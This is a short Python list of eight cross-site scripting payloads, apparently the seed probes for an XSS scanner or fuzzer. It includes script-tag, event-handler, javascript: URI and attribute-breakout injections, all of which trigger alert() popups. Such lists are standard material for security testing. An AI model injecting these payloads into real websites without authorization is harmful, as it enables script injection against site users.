BASE_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<img src=//x55.is onerror=alert(1)>",
    "javascript:alert('XSS')",
    "\"><svg/onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
]